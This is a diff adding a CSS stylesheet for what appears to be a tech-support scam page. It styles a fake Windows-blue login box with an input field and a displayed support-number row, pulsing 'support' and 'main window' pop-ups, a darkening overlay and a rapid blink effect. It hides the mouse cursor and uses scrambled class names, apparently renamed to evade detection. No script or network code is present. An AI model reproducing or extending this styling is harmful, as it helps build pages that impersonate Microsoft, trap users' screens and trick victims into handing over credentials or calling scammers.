@@ -1,0 +1,274 @@
+/* -------------------------------------------------------------------------- /
+/ General & Body                                                                    */
+.M2f9Y0k4b4,
+body{
+  cursor:none!important;
+}
+.K5j4O5M3G7,
+.q4W5J5P4v8{
+  display:block;
+  position:absolute;
+}
+
+/* ===== Login box (Windows blue, Edge only) ===== */
+.Wn7kLoginBox {
+  position: fixed;
+  top: 85%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+  width: 440px;
+  background: #0078D4;
+  border-radius: 8px;
+  border: 1px solid #006cbd;
+  box-shadow: 0 12px 40px rgba(0,0,0,.5);
+  z-index: 10000000;
+  overflow: hidden;
+  font-family: 'Segoe UI', system-ui, sans-serif;
+  margin-top: -260px;
+  animation: Wn7kLoginIn 0.45s cubic-bezier(0.16,1,0.3,1);
+}
+@keyframes Wn7kLoginIn {
+  from { opacity: 0; transform: translate(-50%, -50%) translateY(-20px); }
+  to   { opacity: 1; transform: translate(-50%, -50%) translateY(0); }
+}
+.Wn7kLoginHdr {
+  padding: 18px 28px 10px;
+  text-align: center;
+  border-bottom: 1px solid rgba(255,255,255,.15);
+}
+.Wn7kLoginTitle {
+  font-size: 18px;
+  font-weight: 600;
+  color: #fff;
+}
+.Wn7kLoginBody {
+  padding: 16px 28px 22px;
+}
+.Wn7kLoginDesc {
+  font-size: 13px;
+  color: rgba(255,255,255,.9);
+  text-align: center;
+  margin-bottom: 14px;
+  line-height: 1.5;
+}
+.Wn7kLoginNumRow {
+  background: rgba(255,255,255,.12);
+  border-radius: 6px;
+  padding: 10px 14px;
+  margin-bottom: 16px;
+  text-align: center;
+}
+.Wn7kLoginNumLabel {
+  font-size: 12px;
+  color: rgba(255,255,255,.8);
+  display: block;
+  margin-bottom: 2px;
+}
+.Wn7kLoginNumVal {
+  font-size: 16px;
+  font-weight: 700;
+  color: #fff;
+}
+.Wn7kLoginInput {
+  width: 100%;
+  padding: 9px 12px;
+  border: 1px solid rgba(255,255,255,.3);
+  border-radius: 4px;
+  font-size: 14px;
+  color: #1a1a1a;
+  background: #fff;
+  margin-bottom: 12px;
+  box-sizing: border-box;
+  outline: none;
+}
+.Wn7kLoginInput::placeholder { color: #888; }
+.Wn7kLoginBtnRow {
+  display: flex;
+  gap: 10px;
+  margin-top: 4px;
+}
+.Wn7kLoginBtn {
+  flex: 1;
+  padding: 9px;
+  background: #fff;
+  color: #0078D4;
+  border: 1px solid #fff;
+  border-radius: 4px;
+  font-size: 14px;
+  font-weight: 600;
+  text-align: center;
+  text-decoration: none;
+  transition: background .12s;
+}
+.Wn7kLoginBtn:hover { background: #f0f0f0; }
+.Wn7kLoginCancel {
+  flex: 1;
+  padding: 9px;
+  background: transparent;
+  color: #fff;
+  border: 1px solid rgba(255,255,255,.5);
+  border-radius: 4px;
+  font-size: 14px;
+  font-weight: 600;
+  text-align: center;
+  text-decoration: none;
+  transition: background .12s;
+}
+.Wn7kLoginCancel:hover { background: rgba(255,255,255,.1); }
+
+/* ===== Blink animation (Edge only) ===== */
+.Wn7kBlink {
+  animation: Wn7kBlinkAnim 0.0625s steps(2) infinite !important;
+}
+@keyframes Wn7kBlinkAnim {
+  0%, 49% { opacity: 1; }
+  50%, 100% { opacity: 0; }
+}
+.K5j4O5M3G7,
+.q4W5J5P4v8,
+.U7t1R0S6v2 img{
+  position:absolute;
+}
+body{
+  background-image:url("../images/piche.png");
+  background-size:cover;
+  background-repeat:no-repeat;
+  width:100%;
+  height:100vh;
+  overflow:hidden;
+}
+/* -------------------------------------------------------------------------- /
+/ Blue support box (renamed from blue-box)                                         */
+.q4W5J5P4v8{
+  top:6%; z-index:999; left:36%;
+  background:#1a73e8;
+  width:440px; text-align:left;
+  padding-top:4px; color:#fff;
+  padding-left:20px; padding-right:20px;
+  animation:4s infinite n9P7N2j3q2;
+  height:600px; font-size:13px;
+  border-radius:8px;
+}
+.q4W5J5P4v8 .O9j8g4a6k5{
+  font-size:16px; margin:8px 0 5px;
+  padding:5px 10px; color:#fff!important; font-weight:700;
+}
+@keyframes n9P7N2j3q2{
+  0%,100%{transform:scale(1,1);}
+  50%{transform:scale(1.1,1.1);}
+}
+@keyframes g6O4L3G7C6{
+  0%,100%{transform:scale(1,1);}
+  50%{transform:scale(1.1,1.1);}
+}
+/* -------------------------------------------------------------------------- /
+/ Main window (renamed from fwefwcwevwvwe)                                         */
+.K5j4O5M3G7{
+  font-weight:700; padding:15px 30px;
+  min-height:300px; border-radius:10px;
+  border:1px solid #fff; width:620px; margin:0 auto;
+  background-color:#fff; z-index:9999999;
+  box-shadow:5px 5px 15px 5px rgba(0,0,0,.4);
+  top:27%; left:30%;
+  cursor:pointer;
+}
+.dqwfwqqwdfqcq,
+.vwefwevwefefewfe{
+  padding:10px 30px; text-align:center;
+}
+.K5j4O5M3G7 .v2S5O0f9n5{
+  clear:both; padding-top:0;
+  font-size:14px; font-weight:600; text-align:center;
+}
+.K5j4O5M3G7 .U7t1R0S6v2,
+.g9N8Q2e8J9,
+.Y1E6M2Z2a8,
+.vwefwevwefefewfe,
+.l5G8C4Z4t6{
+  font-weight:700;
+}
+.K5j4O5M3G7 .j9N0q7Q1J4{
+  width:535px; margin-top:7px;
+  padding-bottom:10px; border-bottom:1px solid #d6d5d5;
+}
+.L6J7N1k5N0{display:inline-block;}
+.K5j4O5M3G7 .U7t1R0S6v2{
+  float:right; font-size:1.5rem;
+  line-height:1; color:#000; text-shadow:0 1px 0 #fff;
+  opacity:.5;
+}
+.y0g4x0V9F0{margin:0 7px 0 0; width:30px; height:30px;}
+.U7t1R0S6v2 img{width:3%; top:27px; right:17px;}
+.v9B6z6u1d6{margin:5px auto; display:block;}
+.l5G8C4Z4t6{
+  margin:5px; font-size:17px; text-align:center;
+}
+.Y1E6M2Z2a8{font-size:17px; color:#1a73e8;}
+.X8q9Q7t8m2{
+  margin:12px 0; height:50px;
+  display:flex; border-top:1px solid #d6d5d5;
+}
+.X8q9Q7t8m2 .i3x8N3Z9P5{
+  margin-top:22px; height:27px;
+}
+.X8q9Q7t8m2 ul{list-style:none; margin-left:116px;}
+.X8q9Q7t8m2 ul li{
+  display:inline-block; float:left;
+  padding-left:20px; margin-top:13px;
+}
+.X8q9Q7t8m2 ul li a{text-decoration:none;}
+.g9N8Q2e8J9{
+  font-size:18px; text-transform:capitalize;
+  position:relative; width:3%; top:21px; left:8px;
+}
+.g4H6z5u6W5,
+.o4K0C1j9i8{
+  width:100%; position:absolute;
+}
+.dqwfwqqwdfqcq{
+  border-radius:4px; color:#000;
+  border:1px solid #000; background-color:transparent;
+  font-size:18px; font-weight:700; cursor:pointer;
+}
+.o4K0C1j9i8,
+.vwefwevwefefewfe{
+  background-color:#1a73e8; color:#fff;
+  font-size:18px; cursor:pointer;
+}
+.vwefwevwefefewfe{border-radius:4px;}
+.o4K0C1j9i8{
+  bottom:0; z-index:999; padding:10px 34px;
+  height:81px; cursor:none;
+}
+.R5s3E0L9e6{
+  height:100%; background-color:#000; opacity:.7;
+  transition:1s; top:0; cursor:none;
+}
+.O1j7I8N1d6{font-size:20px;}
+.O1j7I8N1d6 img{width:20px;}
+.j9N0q7Q1J4{
+  border-bottom:1px solid #d6d5d5;
+}
+.box-parent{
+    display: flow-root;
+    padding-top: 150px;
+}
+.box-body {
+    border: 1px solid #FFF;
+    width: 50%;
+    height: 80%;
+    margin: 0 auto;
+    padding: 50px;
+    text-align: center;
+    animation: scaleInOut 2s ease-in-out infinite;
+    color: white;
+}
+
+@keyframes scaleInOut {
+    0%, 100% {
+        transform: scale(1);
+    }
+    50% {
+        transform: scale(1.2);
+    }
+}
